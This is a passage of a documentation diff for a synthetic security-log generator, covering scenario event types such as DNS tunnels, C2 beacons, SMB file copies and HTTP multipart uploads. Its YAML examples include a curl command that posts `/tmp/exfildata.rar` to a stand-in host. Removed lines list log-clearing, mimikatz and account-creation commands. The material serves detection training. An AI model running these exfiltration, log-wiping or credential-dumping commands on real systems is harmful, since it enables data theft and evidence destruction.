-| `dga_queries` | Zeek dns.log + conn.log (bulk DGA) | `interval`, one of `end_time`/`duration`/`count` | `length_range`, `charset`, `tld`, `seed`, `rcode_distribution`, `answer_ip`, `source_ip`, `jitter` (default: 0.3) |
-| `dns_tunnel` | Zeek dns.log + conn.log (encoded exfil) | `base_domain`, `interval`, one of `end_time`/`duration`/`count` | `encoding` (base32/base64/hex), `qtype` (TXT/NULL/CNAME), `label_length`, `payload`, `payload_size`, `source_ip`, `jitter` (default: 0.25) |
-| `explicit_credentials` | Windows 4648 (explicit credential usage) | `target_username` | `target_server`, `process_name`, `source_ip` |
+| `dga_queries` | Zeek dns.log + conn.log (bulk DGA) | `interval`, one of `end_time`/`duration`/`count` | `length_range`, `charset`, `tld`, `seed`, `rcode_distribution`, `answer_ip`, `source_ip`, `ids_alerts`, `jitter` (default: 0.3) |
+| `dns_tunnel` | Zeek dns.log + conn.log (encoded exfil) | `base_domain`, `interval`, one of `end_time`/`duration`/`count` | `encoding` (base32/base64/hex), `qtype` (TXT/NULL/CNAME), `label_length`, `payload`, `payload_size`, `source_ip`, `ids_alerts`, `jitter` (default: 0.25) |
+| `explicit_credentials` | Windows 4648; materialized `runas.exe /netonly` also emits a correlated local Type 9 NewCredentials session | `target_username` | `target_server`, `process_name`, `source_ip` |
 | `workstation_lock` | Windows 4800 (workstation locked) | | |
 | `workstation_unlock` | Windows 4624 type 7 re-auth followed by 4801 unlock | | |
 | `spillage` | Synthetic credential leaked into a semantic surface (`shell_history` → bash history; `process_command_line` → process/EDR telemetry; `syslog_message` → syslog; `http_request_url`/`http_referrer` → a web server's `web_access` log), per-event varied, + canonical `GROUND_TRUTH.json` tracking (emitted or explicitly skipped) | `surface`, and exactly one of `family`/`value` | `scheme` (`http`/`https`, HTTP surfaces only); `http_*` surfaces need a compatible `web_server`-role host |
-| `adversarial_payload` | Known log-pipeline weakness payload (ANSI escape, CRLF log-forging, CSV formula, Log4Shell/JNDI, reflected XSS, SQL injection, structured-log/JSON injection, oversized field; each family ships a canonical form plus seed-picked evasion variants) injected into a semantic surface (`syslog_message`, `process_command_line`, `http_user_agent`, `http_request_url`, `http_referrer`, `dns_qname`, `auth_user`), per-surface encoded, + canonical `GROUND_TRUTH.json` tracking (`kind: adversarial_payload`, incl. `ids_alert` for signature-mapped cleartext-http families). See [adversarial_payload.md](adversarial_payload.md) | `surface`, and exactly one of `family`/`value` | `scheme` (`http`/`https`, HTTP surfaces only); `syslog_message` and `auth_user` are Linux-only; `dns_qname` needs a network sensor emitting Zeek; `http_*` surfaces need a compatible `web_server`-role host; an optional generation-time live-callback (OOB) mode (`generate`/`validate --oob-host`, opt-in) can replace the inert default canary — by default payloads use the non-resolving canary `canary.eforge.invalid` and are never executed, see [adversarial_payload.md](adversarial_payload.md) |
+| `adversarial_payload` | Known log-pipeline weakness payload (ANSI escape, CRLF log-forging, CSV formula, Log4Shell/JNDI, reflected XSS, SQL injection, structured-log/JSON injection, oversized field; each family ships a canonical form plus seed-picked evasion variants) injected into a semantic surface (`syslog_message`, `process_command_line`, `http_user_agent`, `http_request_url`, `http_referrer`, `dns_qname`, `auth_user`), per-surface encoded, + canonical `GROUND_TRUTH.json` tracking (`kind: adversarial_payload`, incl. `ids_alert` for signature-mapped cleartext-http families). See [adversarial_payload.md](https://github.com/Cisco-Talos/EvidenceForge/blob/main/docs/reference/adversarial_payload.md) | `surface`, and exactly one of `family`/`value` | `scheme` (`http`/`https`, HTTP surfaces only); `syslog_message` and `auth_user` are Linux-only; `dns_qname` needs a network sensor emitting Zeek; `http_*` surfaces need a compatible `web_server`-role host; optional live-callback mode requires a fresh matching `--oob-host` on each `resolve`, `validate`, or `generate` invocation — by default payloads use the non-resolving canary `canary.eforge.invalid` and are never executed, see [adversarial_payload.md](https://github.com/Cisco-Talos/EvidenceForge/blob/main/docs/reference/adversarial_payload.md) |
 | `raw` | Any single format | `target_format`, `fields` | |
 
 For `process` events, prefer full process image paths when you know them. Bare executable names are accepted and are normalized through the configured application/process catalog during generation. If a scenario needs a custom install path, add or update the relevant configuration overlay rather than putting an ad hoc path in one storyline event. The generator routes process create/terminate lifecycle and process-owned endpoint side effects through an internal process-execution bundle; scenario authors still describe normal `process` events and do not model the bundle directly.
+
+For Linux process command lines, an exact two-token `sleep <duration>` after shell tokenization models the requested foreground lifetime. `<duration>` may be an unsigned integer or decimal number of seconds, including `30`, `30.5`, and `.5`; signs, suffixes such as `30s`, exponents, non-finite values, malformed quoting, and extra arguments use the existing short fallback lifetime. Modeled numeric sleeps are capped at 86,400 seconds. When the process belongs to a closing SSH or other bounded session, its independent termination is clamped at least 1,425 ms before the session owner closes so the maximum shell-release jitter fits; an impossible action-owned interval is rejected before mutation, while compatibility generation leaves termination to the session owner.
+
+#### `smb_activity`
+
+Use `smb_activity` for file/share semantics. A generic `connection` on TCP/445 is
+transport-only and never infers authentication or file activity from byte counts.
+
+```yaml
+- type: smb_activity
+  operation: copy
+  purpose: collection
+  source:
+    type: share
+    share: FS-LNX-01.engineering
+    selector: {path_glob: 'Projects/**/*.tar.gz'}
+  destination: {type: client, directory: /var/tmp/cache}
+  batch: {count: 25, duration: 4m}
+  outcome: auto
+  path_style: mounted
+  mapping: engineering-linux
+  client_access: cifs_mount
+  auth_protocol: kerberos
+  smb_principal: svc_engineering
+```
+
+Operations are `browse`, `read`, `create`, `update`, `copy`, `move`, and
+`delete`. Every share location uses the exact case-insensitive compiled
+`<system>.<share-id>` reference; bare share IDs and display names are not valid references. Share
+locations accept at most one of `file_ref`, relative `path`, relative destination `directory`, or
+`selector`; omission requests deterministic selection. Selectors must resolve once unless a
+batch supplies exactly one of `count`, `fraction`, or `all: true`. A `type: client` source or
+destination accepts one standalone OS-native absolute `path`, an absolute destination `directory`,
+or a `file_set` narrowed by one `file_ref` or `selector`. A file set alone selects its catalog.
+`path` always names one exact file; `directory` names only a copy/move destination container.
+Batched client sources require a file set, batched destinations require `directory`, and one action
+is capped at 64 operations. Share-relative paths remain SMB-canonical and use `\` separators.
+
+```yaml
+- type: smb_activity
+  operation: copy
+  purpose: collection
+  source:
+    type: client
+    file_set: analyst-documents
+    selector: {extensions: [.docx, .pdf]}
+  destination:
+    type: share
+    share: FS-01.staging
+    directory: WS-01
+  batch: {count: 12, duration: 30s}
+```
+
+The client-file-set upload reuses an immediately preceding authored transfer process such as
+`robocopy.exe`, preserves each selected relative path beneath the destination directory, and uses
+one authenticated SMB lifecycle for the bounded batch. Each destination is a distinct file object
+with the source content identity and hashes. A move commits each destination before retiring its
+source; idempotent SMB mutation/recovery prevents duplicated state or terminal evidence.
+
+`client_access` is `auto`, `windows_native`, `cifs_mount`, or `smbclient`. `auto` resolves Windows
+native access or, on Linux, a persistent kernel CIFS mount only when an applicable mapping has a
+POSIX `mount`; otherwise it selects a one-shot `smbclient` process. Installing `cifs-utils` alone
+does not invent a mount. The resident `linux_gvfs` profile is reserved
+for background transport/process texture; it is not selected for canonical typed file activity.
+`mount.cifs` establishes a mount; it is not attributed as the process performing every mounted
+file operation. Mounted CIFS transport is kernel-owned and may have no endpoint PID, while direct
+`smbclient` is operation-scoped. These credential and mount ownership rules follow the upstream
+[`mount.cifs` contract](https://man7.org/linux/man-pages/man8/mount.cifs.8.html).
+`auth_protocol` is `auto`, `kerberos`, or `ntlmssp`.
+In the initial Samba model, `auto` uses directory-backed Kerberos; Windows retains its native
+negotiation path.
+`smb_principal` sets the credential identity independently of the local process actor; when omitted,
+the activity or mapping resolves it through the identity directory. Samba principals must be
+declared directory users or service accounts; its V1 domain-member model rejects guest and local
+built-in identities. Windows retains its platform-specific built-in accounts. An event principal
+that conflicts with a fixed mapping principal is invalid.
+
+Session/tree reuse is transport- and authentication-reference-bound. A newly generated TCP/445
+transport receives a new SMB session; V1 does not model multichannel or durable reconnection.
+
+`path_style` is `auto`, `unc`, `mapped`, or `mounted`. `mapped` requires a compatible Windows
+mapping and renders its drive; `mounted` requires a compatible Linux mapping and renders its POSIX
+mount. `auto` chooses an OS-compatible presentation; direct `smbclient` uses its
+`//server/share/path` command form, while `unc` retains a network share view. External initiators
+use `client: {type: external, ip: ...}`, require `client_access: auto`, cannot select a storage
+mapping or use mapped/mounted presentation, and emit no client-host telemetry. An explicit access
+mode and path presentation must agree: `cifs_mount` accepts `auto` or `mounted`, while `smbclient`
+accepts `auto` or `unc`. Explicit outcomes are assertions and are validated against path, access,
+platform, mapping, and credential state.
 
 All event types also accept optional `technique` (MITRE ATT&CK ID) and `description` (human-readable detail) fields for GROUND_TRUTH.md enrichment.
 
@@ -908,14 +1325,14 @@ automated, interval-driven, or explicitly minutes/hours apart.
 
 **Legitimate lateral movement:** 26 patterns of inter-server traffic are auto-generated based on the environment topology. These include backup agents, monitoring, AD replication, application-to-database connections, config management, and more. Patterns are conditional on having the required infrastructure (assign `roles` like `file_server`, `database`, `web_server`, `mail_server`, `print_server`, `dns_server`, `nfs_server` on systems to enable specific patterns).
 
-**Compiled world model:** Before generation starts, the engine compiles authoritative host and user capabilities from `primary_system`, `assigned_user`, `roles`, and `services`. That model is then used to place user activity, choose realistic SSH/RDP/network session types, and keep baseline/storyline session bootstrap behavior aligned. Correlated multi-event activities route through action bundles so storyline, baseline, red-herring, and scanner/noise intent share the same lifecycle and evidence semantics. Successful logons, failed logons, logoffs, service logons, machine-account logons, anonymous logons, NTLM validation, and workstation lock/unlock evidence use internal auth/session bundles so scenario authors can describe normal typed auth events while the generator owns session IDs, lock state, source endpoints, validation evidence, and termination ordering. DC-side Kerberos ticket evidence uses the internal Kerberos/DC bundle so TGT/TGS timing, source IP/port, TGT cache behavior, and service-principal identity stay aligned. Windows audit/account-management events use internal Windows audit bundles so subject session ownership, target identity, source timing, and Sysmon/eCAR process-access context stay aligned. Connections use the internal network-connection bundle so `connection`, `beacon`, scanner/probe, proxy, firewall, IDS, EDR/eCAR FLOW, DNS, TLS, HTTP, and Windows WFP evidence share one source/destination tuple and visibility decision.
+**Compiled world model:** Before generation starts, the engine compiles authoritative host and user capabilities from `primary_system`, `assigned_user`, `roles`, and `services`. DHCP server, DNS resolver, domain controller, forward proxy, SSH receiver, and RDP receiver are typed capabilities used consistently by baseline and storyline planning. An activity that requires a distinct peer excludes its requesting host; missing capability remains missing instead of becoming the sole host or a fabricated address. Optional baseline activity skips that family, while authored intent that cannot satisfy its required contract is rejected. Public recursive DNS and NTP endpoints shipped as validated configuration are external capabilities only for traffic that can realistically use them. The model is also used to place user activity, choose realistic SSH/RDP/network session types, and keep baseline/storyline session bootstrap behavior aligned. Correlated multi-event activities route through action bundles so storyline, baseline, red-herring, and scanner/noise intent share the same lifecycle and evidence semantics. Successful logons, failed logons, logoffs, service logons, machine-account logons, anonymous logons, NTLM validation, and workstation lock/unlock evidence use internal auth/session bundles so scenario authors can describe normal typed auth events while the generator owns session IDs, lock state, source endpoints, validation evidence, and termination ordering. DC-side Kerberos ticket evidence uses the internal Kerberos/DC bundle so TGT/TGS timing, source IP/port, TGT cache behavior, and service-principal identity stay aligned. Windows audit/account-management events use internal Windows audit bundles so subject session ownership, target identity, source timing, and Sysmon/eCAR process-access context stay aligned. Connections use the internal network-connection bundle so `connection`, `beacon`, scanner/probe, proxy, firewall, IDS, EDR/eCAR FLOW, DNS, TLS, HTTP, and Windows WFP evidence share one source/destination tuple and visibility decision.
 
 **Network-level red herrings:** The suspicious noise generator includes network-layer patterns: high-entropy DNS queries (CDN subdomains, DoH providers), unusual outbound connections (cloud backup sync, dev tool endpoints), and scheduled vulnerability scan overlaps. Controlled by `baseline_activity.suspicious_noise` level.
 
-The suspicious DNS and unusual outbound target pools are reusable configuration
-data in `activity/suspicious_benign.yaml`; edit that config overlay when a
-project needs different benign red-herring identities. Storyline-authored IPs,
-hostnames, and email addresses still win over fallback pools.
+The suspicious DNS and unusual outbound target pools are reusable configuration data in
+`activity/suspicious_benign.yaml`. Change that project overlay only when the project's ambient
+benign identities should change. If one scenario needs a specific malicious or benign IP, hostname,
+or email address, author it explicitly in the scenario; authored identities win over fallback pools.
 
 **Entity lifecycle validation:** The engine validates that process injection events target existing PIDs and that event timestamps don't precede system boot times. Warnings are logged for impossible sequences.
 
@@ -935,7 +1352,13 @@ hostnames, and email addresses still win over fallback pools.
 
 **Endpoint ProcessAccess realism:** Sysmon Event 10 and eCAR PROCESS OPEN rows use canonical `ProcessAccessContext` owned by the generation bundle. Source images such as Defender, CSRSS, services, svchost, WMI, and suspicious tools select source-aware CallTrace palettes from package config; scenario authors do not need to set call traces in YAML.
 
-**PID allocation:** Windows PIDs use a lognormal distribution for gap sizes (mu=1.2, sigma=0.8), producing mostly small gaps with an occasional heavy tail — simulating background process churn consuming PIDs between emitted events. Linux PIDs use a similar but tighter distribution (mu=0.5, sigma=0.6). No fixed choice-set fingerprint.
+**PID allocation:** Windows PIDs preserve a multiples-of-four, heavy-tailed progression through
+the modeled `4,000..65,532` ring. Linux uses an unbounded logical progression rendered into the
+exclusive `pid_max` range `500..4,194,303`, so long scenarios can wrap naturally. Both systems
+reuse a rendered PID only after natural wrap and only when no active process, fixed boot process,
+or unexpired transient source-native companion still owns it. PID reuse is therefore validated as
+non-overlapping lifetimes on one host rather than forbidden across the entire dataset. Allocation
+history is watermarked and duration-stable; no scenario or output-schema setting is required.
 
 **Per-user bash history:** Baseline SSH sessions to Linux servers generate organic admin commands (ls, df -h, ps aux, systemctl status, etc.) for realistic admin users, creating per-user `<username>.bash_history` files on all Linux hosts. Storyline process events on Linux inject 0-3 organic noise commands around each attack command for realistic interleaving. The generator coordinates bash-history timing with foreground process telemetry through an internal Linux shell-command bundle; scenario authors still use normal `process` events and do not need to model the bundle directly.
 
@@ -945,7 +1368,7 @@ Use `dhcp_lease` for rogue or new devices appearing on the network (e.g., attack
 
 ```yaml
 - time: "+5m"
-  actor: attacker
+  actor: root
   system: ROGUE-LAPTOP
   activity: "Rogue device obtains IP via DHCP"
   events:
@@ -955,7 +1378,7 @@ Use `dhcp_lease` for rogue or new devices appearing on the network (e.g., attack
       technique: "T1200 - Hardware Additions"
 ```
 
-Both `mac_address` and `requested_ip` are optional — the engine auto-generates a MAC (using diversified OUI prefixes from `network_params.yaml`) from the system IP and uses the system's configured IP if omitted. DHCP acquisition and renewal are modeled internally as a DHCP lease action bundle: one lease identity drives Zeek DHCP/conn fan-out, lease metadata, link-local visibility, and Linux `dhclient` syslog companions. DHCP broadcast is link-local in the generator: it appears on SPAN-style Zeek sensors monitoring the client's segment and does not traverse unrelated TAP/firewall boundaries unless a separate relay/server transaction is modeled.
+Both `mac_address` and `requested_ip` are optional — the engine auto-generates a MAC (using diversified OUI prefixes from `network_params.yaml`) from the system IP and uses the system's configured IP if omitted. The scenario must contain a distinct modeled DHCP server, declared with `roles: [dhcp_server]` or a recognized DHCP service. Authored `dhcp_lease` intent fails validation without one; optional baseline DHCP activity is skipped. DHCP acquisition and renewal are modeled internally as a DHCP lease action bundle: one lease identity drives Zeek DHCP/conn fan-out, lease metadata, link-local visibility, and Linux `dhclient` syslog companions. The lease's T1 renewal interval is selected once and retained for that lifecycle. DHCP broadcast is link-local in the generator: it appears on SPAN-style Zeek sensors monitoring the client's segment and does not traverse unrelated TAP/firewall boundaries unless a separate relay/server transaction is modeled.
 
 ### Port Scan Events
 
@@ -963,7 +1386,7 @@ Use `port_scan` for network reconnaissance, host sweeps, lateral scans, or worm-
 
 ```yaml
 - time: "+1h"
-  actor: attacker
+  actor: www-data
   system: WEB-EXT-01
   activity: "Port scan of server VLAN from compromised DMZ host"
   events:
@@ -987,7 +1410,7 @@ Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) o
 ```yaml
 # Allowed beacon through proxy
 - time: "+3h"
-  actor: attacker
+  actor: marcus.chen
   system: workstation01
   activity: "C2 beacon to attacker infrastructure"
   events:
@@ -1004,7 +1427,7 @@ Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) o
 
 # Explicit per-beat HTTP variation
 - time: "+3h30m"
-  actor: attacker
+  actor: marcus.chen
   system: workstation01
   activity: "C2 beacon with rotating tasking paths"
   events:
@@ -1023,7 +1446,7 @@ Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) o
 
 # Denied beacon (equivalent to former blocked_c2)
 - time: "+5h"
-  actor: attacker
+  actor: SYSTEM
   system: DC-01
   activity: "Blocked C2 beaconing — firewall denies outbound from DC"
   events:
@@ -1037,7 +1460,61 @@ Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) o
       technique: "T1071.001 - Web Protocols"
 ```
 
-Timing fields: `start_time` (optional, defaults to parent event time), `interval` (required), one of `end_time`/`duration`/`count` (required), `jitter` (0.0-1.0, default: **0.15** — beacons are deliberately tight). Connection fields: all `connection` fields (dst_ip, dst_port, hostname, service, protocol, method, uri, user_agent, `referrer`, etc.). `profile` selects a behavior-shaped synthetic profile from `config/activity/beacon_profiles.yaml`; bundled profiles model broad check-in/tasking shapes, not live malware IoCs. `http_sequence` cycles explicit per-tick request shapes and can use deterministic URI tokens: `{host_id}`, `{campaign_id}`, `{tick}`, `{hex8}`, `{guid}`, and `{base64url:N}`. Sequence entries may override `method`, `uri`, `user_agent`, `referrer`, `status_code`, `response_body_len`, `orig_bytes`, and `resp_bytes`; byte fields accept either an integer or `[min, max]`. For `hostname`, use the client-facing DNS name used by the beacon, not a reverse-DNS/PTR artifact, unless that is intentionally part of the scenario. `action`: `allow` (default) or `deny`. Set `referrer` to pin the HTTP Referer header for a specific beacon URL (e.g., a phishing page that launched the download). In explicit proxy mode, HTTP/S beacons from hosts routed through a `forward_proxy` traverse the proxy; denied proxyable beacons stop at the proxy and emit proxy-denied CONNECT/GET evidence rather than direct client-to-origin network evidence.
+Timing fields: `start_time` (optional, defaults to parent event time), `interval` (required), one of `end_time`/`duration`/`count` (required), `jitter` (0.0-1.0, default: **0.15** — beacons are deliberately tight). Connection fields: all `connection` fields (dst_ip, dst_port, hostname, service, protocol, method, uri, user_agent, `referrer`, etc.). `profile` selects a behavior-shaped synthetic profile from `config/activity/beacon_profiles.yaml`; bundled profiles model broad check-in/tasking shapes, not live malware IoCs. `http_sequence` cycles explicit per-tick request shapes and can use deterministic URI tokens: `{host_id}`, `{campaign_id}`, `{tick}`, `{hex8}`, `{guid}`, and `{base64url:N}`. Sequence entries may override `method`, `uri`, `user_agent`, `referrer`, `status_code`, `request_body_len`, `request_multipart`, `response_body_len`, `response_multipart`, `orig_bytes`, and `resp_bytes`; byte fields accept either an integer or `[min, max]`, but multipart outer-size assertions must be exact integers. For `hostname`, use the client-facing DNS name used by the beacon, not a reverse-DNS/PTR artifact, unless that is intentionally part of the scenario. `action`: `allow` (default) or `deny`. Set `referrer` to pin the HTTP Referer header for a specific beacon URL (e.g., a phishing page that launched the download). In explicit proxy mode, HTTP/S beacons from hosts routed through a `forward_proxy` traverse the proxy; denied proxyable beacons stop at the proxy and emit proxy-denied CONNECT/GET evidence rather than direct client-to-origin network evidence.
+
+### Correlated IDS attachments
+
+Typed `connection`, `beacon`, `ssh_session`, `rdp_session`, `dhcp_lease`,
+`port_scan`, `dns_query`, `dga_queries`, `dns_tunnel`, and `web_scan` events may
+assert one or more configured signature matches with `ids_alerts`. EvidenceForge resolves each SID from
+`activity/ids_signatures.yaml` and attaches it to every physical canonical
+connection produced by the event. The resulting Snort row therefore shares the
+sensor-observed timestamp, source port, tuple, and NAT/PAT view with the related
+network evidence. This is an assertion that the signature matched; EvidenceForge
+does not execute the complete Snort rule predicate.
+
+Inspect the effective curated catalog with `eforge info ids_signatures` before choosing an
+attachment. The text output lists valid SIDs with concise transport and message context; use its
+`--json` form directly when exact structured compatibility fields are needed.
+
+Attachments fan out only across transports owned by that authored event: one
+SSH/RDP session transport, the authored DHCP transaction, every scan probe or
+web request, and every authored DNS/DGA/tunnel query. Later automatic DHCP
+renewals do not inherit the assertion, and DNS-tunnel background cover traffic
+does not inherit a tunnel signature. Web-scan preset alerts coexist with
+authored alerts; an authored attachment wins if both use the same `(gid, sid)`.
+`email_message` and `email_read` do not yet accept attachments. A network tuple
+alone never creates a Snort alert, and IDS sensors do not decrypt traffic.
+
+```yaml
+- type: beacon
+  dst_ip: 45.83.221.30
+  dst_port: 443
+  service: ssl
+  interval: 2m
+  duration: 45m
+  ids_alerts:
+    - sid: 2028401
+    - sid: 2002910
+      policy:
+        detection_filter: {track: by_src, count: 5, seconds: 60}
+        event_filter: {type: limit, track: by_src, count: 1, seconds: 300}
+```
+
+An omitted `policy` inherits the signature's optional `alert_policy`. Use
+`policy: every` to replace that default and alert on every visible candidate.
+A policy object replaces the signature default and may contain
+`detection_filter`, `event_filter`, or both. Filters support `track: by_src` or
+`by_dst`; event-filter types are `limit`, `threshold`, and `both`; `count` and
+`seconds` must be positive integers. The same SID must have one effective policy
+throughout a scenario.
+
+Filtering is per IDS sensor and post-NAT sensor-visible IP. Observation drops,
+invisible connections, warm-up records, and output-window clipping do not advance
+filter state. With explicit proxies, attachments follow the client-to-proxy and
+proxy-to-origin physical legs; sensor placement selects the visible side. Denials
+and cache hits do not invent an origin leg. Prefer this facility over raw Snort
+events whenever the alert must correlate with canonical network evidence.
 
 ### DNS Query Events
 
@@ -1210,7 +1687,7 @@ For web-based attack steps (SQL injection, web shell access, etc.), use `connect
 
 ```yaml
 - time: "+1h10m"
-  actor: attacker
+  actor: www-data
   system: WEB-01
   activity: "SQL injection probe against EHR portal"
   events:
@@ -1225,7 +1702,71 @@ For web-based attack steps (SQL injection, web shell access, etc.), use `connect
       user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
 ```
 
-HTTP optional fields on `connection` events: `method` (GET/POST/etc.), `uri`, `status_code`, `user_agent`, `referrer`, `response_body_len`. When these are provided with `service: http`, the engine generates correlated web_access, zeek_http, and zeek_conn records from a single SecurityEvent. The `referrer` field defaults to `null` (auto-generated from the traffic context — search engine, same-origin, social, or blank); set it explicitly for phishing click scenarios or specific referrer chain modeling (e.g., `referrer: "https://evil.example.com/page"`). The same `referrer` and `response_body_len` fields are available on `beacon` events.
+HTTP optional fields on `connection` events: `method` (GET/POST/etc.), `uri`, `status_code`, `user_agent`, `referrer`, `request_body_len`, `response_body_len`. With `service: http`, the engine generates correlated web_access, zeek_http, zeek_conn, and visible files.log records. `request_body_len` pins the exact transmitted request entity size; originator TCP bytes still include HTTP framing. Every successfully transmitted plaintext request body receives originator-direction Zeek file analysis, including background forms, APIs, telemetry, beacons, and red herrings. Every transmitted nonempty plaintext response entity receives responder-direction analysis, including tiny redirects, authentication failures, and other error bodies. HEAD, 1xx, 204, 205, 304, successful CONNECT, zero-byte, failed-transport, and opaque HTTPS responses remain fileless. Anonymous bodies do not invent endpoint file reads. Both body-length fields are available on `beacon` and `beacon.http_sequence`; sequence values may be exact integers or `[min, max]` ranges.
+
+Request MIME type is derived from the owning activity unless a resolved upload supplies stronger metadata. Curl `--data-binary @path`, `--upload-file path`, `-T path`, and multipart `-F name=@path` resolve a local source file and curl-owned endpoint read. Local source names stay in ground truth and do not become Zeek filenames unless the HTTP message exposes one: raw `--data-binary` has no wire filename, while multipart normally does. Response MIME preserves explicit/application metadata, otherwise follows URI inference, redirect/error `text/html`, then `application/octet-stream`; response URLs never invent filenames. `http_file_profiles.yaml` maps extensions such as `.rar` to `application/vnd.rar`. A plaintext proxy MISS creates leg-local FUIDs for matching origin→proxy and proxy→client content; a HIT or proxy error creates only the client-leg response file. HTTPS stays opaque without modeled decryption.
+
+`request_multipart` and `response_multipart` are available on `connection`,
+`beacon`, `beacon.http_sequence`, and application/web-route method profiles. They
+accept ordered `multipart/form-data` or `multipart/mixed` parts; repeated names and
+nested multipart containers are preserved. A leaf defines exactly one of `value`,
+`body_len`, or `local_source_path`, plus optional `filename`, `filename_star`,
+`content_type`, `content_type_name`, `detected_mime_type`, `content_length`, and
+`transfer_encoding` (`binary`, `7bit`, `8bit`, `base64`, or `quoted-printable`).
+Direct form-data parts require `name`. Literal UTF-8 values derive their decoded
+size. The engine deterministically generates a client-shaped boundary when it is
+omitted and derives the outer body size from the complete serialization. An
+authored `request_body_len`/`response_body_len` alongside multipart is an exact
+assertion and a mismatch is rejected; profile body-size ranges are mutually
+exclusive with multipart.
+
+```yaml
+- type: connection
+  dst_ip: 45.33.32.30
+  dst_port: 80
+  hostname: some.site
+  service: http
+  method: POST
+  uri: /uploads/accept-upload
+  request_multipart:
+    media_type: multipart/form-data
+    parts:
+      - name: metadata
+        value: '{"case":"1234"}'
+        content_type: application/json
+      - name: archive
+        body_len: 44040192
+        local_source_path: /tmp/exfildata.rar
+        filename: exfildata.rar
+        content_type: application/vnd.rar
+        detected_mime_type: application/vnd.rar
+```
+
+The outer request is larger than 44,040,192 bytes because it includes the
+multipart envelope; the matching file row remains exactly 44,040,192 decoded
+bytes. Curl `-F`/`--form` and `--form-string` are parsed in order. `@path` emits a
+file-backed part and wire filename, `<path` emits a file-backed field without a
+filename, and literals emit no endpoint read. `filename=`, `type=`, and `encoder=`
+modifiers are honored. More than one unresolved local file size is rejected.
+Chunked/content-coded multipart and `multipart/byteranges` are not supported.
+
+```yaml
+events:
+  - type: process
+    process_name: /usr/bin/curl
+    command_line: >-
+      /usr/bin/curl --data-binary @/tmp/exfildata.rar
+      http://some.site/uploads/accept-upload
+  - type: connection
+    dst_ip: "45.33.32.30"
+    dst_port: 80
+    hostname: some.site
+    service: http
+    method: POST
+    uri: /uploads/accept-upload
+    request_body_len: 44040192
+    status_code: 200
+```
 
 **Byte and connection state overrides:** `orig_bytes` (originator payload bytes), `resp_bytes` (responder payload bytes), `response_body_len` (HTTP response body bytes rendered in `web_access` / `proxy_access`), `conn_state` (Zeek connection outcome: SF, S0, REJ, etc.). When omitted, the engine auto-sizes bytes based on the event's `technique`, `description`, URI, and HTTP status (exfiltration -> large `orig_bytes`; C2 -> small bidirectional; downloads -> large successful response bodies; 4xx/5xx -> small error pages), and defaults `conn_state` to SF. Set `response_body_len` to pin exact HTTP body bytes; if it is omitted on an HTTP event, explicit `resp_bytes` is also used as the HTTP body-size override before connection-level protocol overhead is added. Set `conn_state` explicitly to model failed connections (e.g., `S0` for a dead C2 channel, `REJ` for a blocked exfil attempt).
 
@@ -1235,7 +1776,7 @@ The `raw` event type targets a specific output format with arbitrary field data.
 
 ```yaml
 - time: "+2h"
-  actor: attacker
+  actor: www-data
   system: WEB-01
   activity: "Custom syslog entry"
   events:
@@ -1252,27 +1793,14 @@ The `raw` event type targets a specific output format with arbitrary field data.
 
 `target_format` must be a supported format name (e.g., `syslog`, `windows_event_security`, `ecar`, `zeek_conn`). The `fields` dict is passed directly to the target emitter without schema validation — ensure field names match the format's expected structure. The event's timestamp is automatically injected if not provided in `fields`.
 
-### Correlated Events for Process Commands
+### Causal Expansion and Process Commands
 
-When a `process` event declares a command that would produce additional audit events in a real environment, those correlated events should be explicitly declared in the same step's `events` list. This ensures complete, realistic log output regardless of what command is being run.
+Author the primary real-world typed intent. Action bundles and causal expansion own ordinary DNS,
+transport, authentication, session, audit, source fan-out, and lifecycle companions. Do not add
+renderer-shaped rows or manually recreate those siblings.
 
-The table below shows common categories of commands and the correlated event types to declare alongside the `process` event:
-
-| Command Category | Example Commands | Correlated Event Type |
-|-----------------|------------------|----------------------|
-| Account creation | `net user /add`, `useradd`, `New-ADUser`, `dsadd user` | `account_created` |
-| Account deletion | `net user /delete`, `userdel`, `Remove-ADUser` | `account_deleted` |
-| Group membership changes | `net group /add`, `net localgroup /add`, `Add-ADGroupMember`, `usermod -aG` | `group_member_added` |
-| Service creation | `sc create`, `New-Service`, `systemctl enable` | `service_installed` |
-| Scheduled task creation | `schtasks /Create`, `at`, `crontab -e`, `Register-ScheduledTask` | `scheduled_task_created` |
-| Log clearing | `wevtutil cl`, `Clear-EventLog`, `rm /var/log/*` | `log_cleared` |
-| Process injection | mimikatz `sekurlsa::`, reflective DLL injection, process hollowing | `create_remote_thread` |
-
-This is not an exhaustive list -- any command that would produce a distinct audit trail should have its correlated events declared explicitly.
-
-#### Engine Safety Net
-
-The engine automatically infers correlated events for 6 common Windows command patterns when `supplementary: auto` (the default) is set on a process event:
+For a Windows `process`, `supplementary: auto` (the default) recognizes six common command
+families and emits their audit companion:
 
 | Command Pattern | Auto-Inferred Event |
 |----------------|---------------------|
@@ -1283,72 +1811,25 @@ The engine automatically infers correlated events for 6 common Windows command p
 | `sc create <name> binPath=` | 4697 (service installed) |
 | `wevtutil cl Security` | 1102 (log cleared) |
 
-This safety net catches common cases, but should not be relied upon as the primary mechanism -- always declare correlated events explicitly. If the same event type is already in the `events` list, auto-inference skips it (no duplicates). Set `supplementary: none` to disable auto-inference entirely.
+Do not duplicate an inferred companion. Add an explicit typed sibling only when that action is
+independently part of the narrative or exact authored fields are required; use
+`supplementary: none` when the explicit declaration should be the sole owner. Specialized
+`process_access` and `create_remote_thread` events remain appropriate when process access or
+injection is itself the narrative.
 
-### Best Practices
+Cross-system Kerberos, DNS, transport, and session evidence is also bundle-owned for typed logon,
+connection, SSH, and RDP intent. Author a separate event only for a separate real-world action.
 
-1. **Always declare the primary action explicitly** -- don't rely on inference for the main event
-2. **Declare correlated events for process commands** -- if a command creates an account, installs a service, clears logs, etc., add the corresponding event type to the `events` list
-3. **Explicitly declare cross-system events** -- inference cannot generate events on other systems (e.g., DC Kerberos for domain logon, RDP logon on target)
-4. **Explicitly declare events when field precision matters** -- auto-inference uses deterministic identity-directory values; declare typed account/identity events when a specific target, group, SID, UID, or account relationship matters to the exercise
-5. **Use explicit events for specialized detection types** -- CreateRemoteThread, LSASS access; inference doesn't detect these patterns
-
-### Examples
-
-**Password spray + lateral movement:**
-```yaml
-- time: "+30m"
-  actor: attacker
-  system: WS-01
-  activity: "Password spray against domain accounts"
-  events:
-    - type: failed_logon
